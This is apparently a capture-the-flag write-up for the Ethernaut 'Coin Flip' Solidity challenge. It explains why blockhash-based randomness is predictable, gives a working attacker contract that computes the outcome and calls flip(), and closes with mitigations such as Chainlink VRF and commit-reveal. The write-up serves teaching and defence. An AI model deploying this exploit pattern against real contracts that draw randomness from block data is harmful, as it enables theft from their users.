# 03 - Coin Flip

## 1. Challenge Overview

- **Objective**: Guess the correct outcome 10 times in a row (`consecutiveWins == 10`).
- **Vulnerability Category**: Insecure On-Chain Randomness / Predictable State (SWC-120).

---

## 2. Contract Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

---

## 3. Vulnerability Analysis

### The Flaw

The contract attempts to generate randomness using on-chain block data:

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

Here, `FACTOR` is 2^255(`57896044618658097711785492504343953926634992332820282019728792003956564819968`). Dividing a 256-bit hash by 2^255 inspects the most significant bit (MSB):

- If the MSB is `0`: `coinFlip = 0` (`false`).
- If the MSB is `1`: `coinFlip = 1` (`true`).

### Why It Fails

Block variables like `block.number`, `block.timestamp`, and `blockhash(...)` are **completely public and deterministic**:

1. At the moment any transaction in block $N$ is being executed, `blockhash(block.number - 1)` is already fixed and publicly readable by all contracts.
2. A smart contract can read `blockhash(block.number - 1)`, replicate the exact calculation, and submit the winning guess within the **same atomic transaction**.

### Block Constraint

The contract prevents multiple guesses in the same block:

```solidity
if (lastHash == blockValue) {
    revert();
}
```

This forces an attacker to submit 10 separate transactions across 10 distinct blocks.

---

## 4. Exploit Architecture

### 1. Attacker Contract (`src/challenges/CoinFlipAttack.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ICoinFlip} from "../interfaces/ICoinFlip.sol";

contract CoinFlipAttack {
    ICoinFlip public immutable target;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool success = target.flip(side);
        require(success, "Flip failed");
    }
}
```

### 2. Execution Script (`script/03-CoinFlip.s.sol`)

- **First Run**: Deploys `CoinFlipAttack` pointing to `INSTANCE_ADDRESS`, then executes Flip 1.
- **Subsequent Runs**: Reuses the deployed attack contract via `COINFLIP_ATTACK_ADDRESS` to execute the remaining flips across blocks.

### 3. Local Verification (`test/03-CoinFlip.t.sol`)

Using `vm.roll(block.number + 1)`, we proved that 10 consecutive wins are guaranteed locally before running on-chain:

```bash
forge test --match-contract CoinFlipTest -vvvv
```

---

## 5. Real-World Relevance

Many early Ethereum gambling applications (such as SmartBillions and several dice/lottery games) relied on `blockhash`, `block.timestamp`, or `block.difficulty` for random number generation. Attackers routinely exploited these contracts by deploying smart contracts that calculated the outcome in advance, only proceeding with the bet when victory was guaranteed, or reverting when they were set to lose.

Miners/validators can also manipulate or bias block hashes if the financial payoff of winning exceeds the block reward.

---

## 6. Prevention & Best Practices

- **Chainlink VRF (Verifiable Random Function)**: The gold standard for Web3 randomness. Uses off-chain cryptographic proofs that cannot be tampered with or predicted by users or miners.
- **Commit-Reveal Schemes**: Participants commit to a secret hash in round 1, then reveal the preimage in round 2.
- **Pyth Entropy / RANDAO**: Decentralized entropy mechanisms provided by beacon chains or decentralized oracle networks.
- **Rule of Thumb**: **Never** rely on EVM global block variables (`blockhash`, `block.timestamp`, `block.prevrandao`) for high-stakes randomness.
